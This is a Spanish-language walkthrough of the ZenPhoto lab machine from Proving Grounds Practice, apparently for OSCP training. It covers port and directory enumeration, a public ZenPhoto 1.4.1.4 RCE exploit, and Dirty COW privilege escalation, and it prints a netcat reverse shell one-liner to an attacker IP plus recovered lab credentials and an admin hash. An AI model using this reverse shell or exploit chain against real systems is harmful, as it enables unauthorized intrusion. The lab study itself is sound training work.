---
layout: post
title: ZenPhoto (Linux - Intermediate) - Proving Grounds Practice
date: 13.06.2025
categories: [Linux, Proving Grounds, Proving Grounds Practice, Walkthrough, OSCP, Tutorial]
tag: [Proving Grounds Practice, Proving Grounds, Linux, HTTP, DirSearch, Fuzzing, ZenPhoto, ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution, PHP, mysql, MYSQL, DataBase, Kernel Exploit, Linux Version, GCC, Dirty, Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method), Linux Kernel 2.6.22, Dirty Cow, PERL, black-hole.pl, Intermediate]
---

# Resolución paso a paso de la máquina ZenPhoto:

## ENUMERACIÓN

### NMAP

- Realizamos el primer escaneo para ver que puertos están abiertos:

```bash
nmap -p- --open -v -n 192.168.162.41 -oG allPorts
```

![image.png](assets/img/post-img/ZenPhoto/image.png)

- Enumeramos los **SERVICIOS ACTIVOS** en los **PUERTOS** que hemos descubierto:

```bash
nmap -sCV -p22,23,80,3306 --min-rate 5000 192.168.162.41 -oN targeted
```

![image.png](assets/img/post-img/ZenPhoto/image%201.png)

- Vemos que tenemos **4** puertos abiertos, entre ellos **MYSQL** que no nos permite interactuar desde nuestra máquina, Telnet más de lo mismo y para **SSH** no tenemos credenciales. Solo nos queda el puerto **80**, por lo que vamos a realizar un poco de enumeración web, empezando por **FUZZING DE DIRECTORIOS**:

### DIRSEARCH

```powershell
dirsearch  -u http://192.168.162.41/test -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x 403,400,404
```

![image.png](assets/img/post-img/ZenPhoto/image%202.png)

- Con **DIRSEARCH** conseguimos sacar algo de información y, entre los directorios hay un **ROBOTS.TXT** donde encontramos algunas rutas interesantes, entre ellas una ruta UPLOADED, que en el caso de poder subir alguna **WEBSHELL** o algun archivo malicioso no puede ser útil para poder ejecutarlos.

![image.png](assets/img/post-img/ZenPhoto/image%203.png)

- En el **ROBOTS** también encontramos un directorio **ZP-CORE** que nos redirige a un **ADMIN.PHP** con un **PANEL DE LOGIN** de un gestor de contenido de fotografía e imagenes (**ZenPhoto**). Probamos credenciales por defecto, alguna inyección **SQL** y parece que no conseguimos nada. Lanzamos también **HYDRA** para ir realizando F**UERZA BRUTA** pero tampoco obtenemos resultados.
- En el directorio **TEST** del servidor web, que parece ser el directorio raíz podemos identificar la versión de **ZenPhoto** que se está ejecutando, la **1.4.1.4**:

![image.png](assets/img/post-img/ZenPhoto/image%204.png)

- Investigamos un poco y encontramos un **EXPLOIT** para esa versión en **EXPLOIT-DB**:

[ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution](https://www.exploit-db.com/exploits/18083)

## EXPLOTACIÓN

- Nos descargamos el **EXPLOIT** y lo lanzamos pasándole el **TARGET** y el **DIRECTORIO** y ganamos una **SHELL** bajo el usuario **WWW-DATA**:

```powershell
php 18083.php 192.168.162.41 /test/
```

![image.png](assets/img/post-img/ZenPhoto/image%205.png)

- Para poder operar más comodamente vamos a lanzarnos una **REVERSE SHELL** hacia nuestra máquina atacante y a realizar el tratamiento de la tty:

```powershell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.223 4444 >/tmp/f
```

- Recibimos la conexión:

![image.png](assets/img/post-img/ZenPhoto/image%206.png)

## TRATAMIENTO DE LA TTY

- Realizamos el tratamiento de la **TTY** para poder trabajar más cómodos desde una **SHELL INTERACTIVA**:

```bash
script /dev/null -c bash

control+z

stty raw -echo; fg

reset xterm

export TERM=xterm-256color

export SHELL=bash

stty rows 52 columns 214 
```

- Ahora que ya hemos ganado acceso a la máquina y podemos operar con comodidad podemos leer la primera **FLAG**:

![image.png](assets/img/post-img/ZenPhoto/image%207.png)

### RECONOCIMIENTO

- Empezamos realizando un poco de reconocimiento interno y lanzamos [**LINPEASS.SH](http://LINPEASS.SH).** En el **OUTPUT** encontramos que tenemos levantado el **SERVIDOR MYSQL** desde el que no podiamos acceder desde fuera de la máquina. Intentamos acceder con credenciales por defecto pero no nos deja:

![image.png](assets/img/post-img/ZenPhoto/image%208.png)

![image.png](assets/img/post-img/ZenPhoto/image%209.png)

- Sabemos que tenemos acceso a una **BBDD** por lo que intentamos encontrar credenciales de acceso. Para ello intentamos buscar por el sistema algún archivo ***CONFIG***, en este caso lo buscamos con **LOCATE** y encontramos un archivo **ZP-CONFIG.PHP** donde encontramos las credenciales de acceso a la **BASE DE DATOS**:

```powershell
locate config
```

![image.png](assets/img/post-img/ZenPhoto/image%2010.png)

![image.png](assets/img/post-img/ZenPhoto/image%2011.png)

> 
**User: root**  
**Password: hola**  
**Database: zenphoto**
> 

- Intentamos acceder y vemos que nos obliga a pasarle directamente el nombre de la **BASE DE DATOS** a la que queremos acceder y lo logramos:

```powershell
mysql -u root -p zenphoto -h 127.0.0.1 -P 3306
```

![image.png](assets/img/post-img/ZenPhoto/image%2012.png)

- Una vez dentro de la **BBDD** logramos encontrar credenciales hasheadas del usuario **ADMIN**:

![image.png](assets/img/post-img/ZenPhoto/image%2013.png)

> 
**User: admin**  
**Hash: 63e5c2e178e611b692b526f8b6332317f2ff5513**
> 

- Después de intentar crackear el **HASH** durante un rato no lo logramos e intentamos buscar otra opción para poder escalar nuestros privilegios:

## ESCALADA DE PRIVILEGIOS

- Enumerando el sistemna vemos que tenemos una versión de **LINUX** muy antigua. Buscamos un poquito en **EXPLOIT-DB** y encontramos varios **EXPLOITS**, probamos alguno y no nos funciona pero al final probamos el **DIRTY COW** y no permite elevar privilegios:

[Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)](https://www.exploit-db.com/exploits/40839)

- Descargamos el **EXPLOIT** y lo transferimos a la máquina víctima para compilarlo desde ahí con **GCC**:

![image.png](assets/img/post-img/ZenPhoto/image%2014.png)

- Una vez compilado lo ejecutamos y nos creará un nuevo usuario “**FIREFART**” con privilegios de **ROOT**, para ello nos pedirá que introduzamos la contraseña que queramos y despues saldremos. Ahora nos logueamos como el nuevo usuario **FIREFART** y le pasamos la contraseña que hemos puesto. Y ya estaremos corriendo con permisos de **ROOT**:

![image.png](assets/img/post-img/ZenPhoto/image%2015.png)

- Ahora ya podemos ir al directorio **ROOT** y leer la **FLAG**:

![image.png](assets/img/post-img/ZenPhoto/image%2016.png)